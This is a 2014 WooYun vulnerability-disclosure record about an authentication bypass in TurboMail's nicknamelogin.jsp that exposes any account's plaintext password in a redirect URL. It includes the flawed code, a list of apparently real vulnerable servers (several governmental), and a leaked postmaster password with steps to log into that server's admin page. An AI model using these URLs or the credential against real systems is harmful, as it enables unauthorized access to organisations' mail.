{"id": 48241, "wybug_id": "wooyun-2014-078331", "wybug_title": "TurboMail邮件系统任意账号登录漏洞（附众多案例）", "wybug_corp": "国家互联网应急中心", "wybug_author": "error", "wybug_date": "2014-10-04 21:24", "wybug_open_date": "2015-01-02 21:26", "wybug_type": "非授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "敏感接口缺乏认证", "认证缺陷", "设计不当导致攻击界面扩大"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-14：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-02：\t细节向公众公开  简要描述： TurboMail邮件系统某处接口验证不严，导致任意账号登陆漏洞，同时还泄露账号的明文密码。 详细说明：  官网：http://www.turbomail.org/百度搜索：Powered by TurboMail 可以发现用户量还是很大的漏洞文件：/nicknamelogin.jsp\n漏洞代码如下：<%        //传入的是昵称    String name = request.getParameter(\"name\");\tname = Util.formatRequest(name,MailMain.s_os,\"GBK\");      \t//http://localhost:8080/mailmain?type=login&uid=test&pwd=test&domain=test.com\tString uid = null;\tString domain = null;\tString pwd = null;\t\tUserAccountList ual = new UserAccountList();\ttry {\t\tual.init(null, 0, null, 0,\t\t\t\tMailMain.s_config.UsersPerPage, 1, null,\t\t\t\t\"first_name\", name, null,true);\t\tint iSize = ual.alUserAccount.size();\t\tif (iSize > 0) {\t\t\tUserAccount ua = (UserAccount) ual.alUserAccount\t\t\t\t\t.get(0);\t\t\t\t\t\tif(ua != null){\t\t\t\tuid = ua.username;\t\t\t\tdomain = ua.m_domain;\t\t\t\tpwd = ua.getOrgPassword();\t\t\t}\t\t}\t} catch (Exception e) {\t}\tif(uid != null){\t\tresponse.sendRedirect(\"mailmain?type=login&uid=\" + uid + \"&pwd=\"+ pwd + \"&domain=\" + domain + \"&style=enterprise\");\t}else{\t\t%>找不到该用户<%\t\t}%>\n\n代码实现上仅仅通过参数name来查询邮箱用户信息，如果存在就将该用户的标示uid = ua.username;用户的域domain = ua.m_domain;用户的明文密码pwd = ua.getOrgPassword();直接取出，然后使用这些信息进行重定向到登录界面mailmain?type=login&uid=&pwd=&domain=\n\n整个过程确实密码的验证，只是简单的判断了下是否存在给定的邮箱账号，导致任意邮箱账号登录，同时在这个过程中还直接泄露了该邮箱账号对于的域名domain和明文密码等敏感信息。\n\n通过直接访问/nicknamelogin.jsp页面，即不给name赋值，默认会返回邮箱账号的第一个账号\n   漏洞证明：  \n测试案例：http://chinagrain.gov.cn:100/nicknamelogin.jsp\t国家粮食局\n\nhttp://58.42.230.121/nicknamelogin.jsp?name=postmaster    贵州省煤矿设计研究院\n\n\n\nhttp://218.206.233.148/nicknamelogin.jsp        河南省人民政府国有资产监督管理委员会\n\n\n\nhttp://113.11.196.145/nicknamelogin.jsp?name=postmaster 东方银行业高级管理人员研修院\n\n\n\nhttp://mail.dcc-bj.com/nicknamelogin.jsp?name=postmaster\n\n\n\n虽然登录失败，但是返回的url链接直接泄露明文密码：http://mail.dcc-bj.com/mailmain?type=login&uid=postmaster&pwd=S!r+v1538dcc&domain=root&style=enterprise使用获取到的postmaster账号密码S!r+v1538dcc到域管理页面登陆: http://mail.dcc-bj.com/maintlogin.jsp\n\n\n\nhttp://59.108.58.99/nicknamelogin.jsp\n\n\n\nhttp://124.205.74.197/nicknamelogin.jsp        \n\n\n\nhttp://mail.slxinke.com:8080/nicknamelogin.jsp\n\n\n\nhttp://mail.mymovies.com.cn/nicknamelogin.jsp\n\n\n\nhttp://mail.henan-cdt.com/nicknamelogin.jsp\n\n\n\nhttp://mail.fseet.com/nicknamelogin.jsp\n\n\n\nhttp://mail.jdjt.net/nicknamelogin.jsp\n\n\n\nhttp://mail.ibuonline.com/nicknamelogin.jsp\n\n\n\nhttp://mail.ieds.com.cn/nicknamelogin.jsp\n\n\n\nhttp://mail.cttsx.com/nicknamelogin.jsphttp://pop3.avictc.com/nicknamelogin.jsp?name=postmaster\n   修复方案：  加强验证   版权声明：转载请注明来源 error@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2014-10-11 15:03 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-14 13:03 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  权限控制不行    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}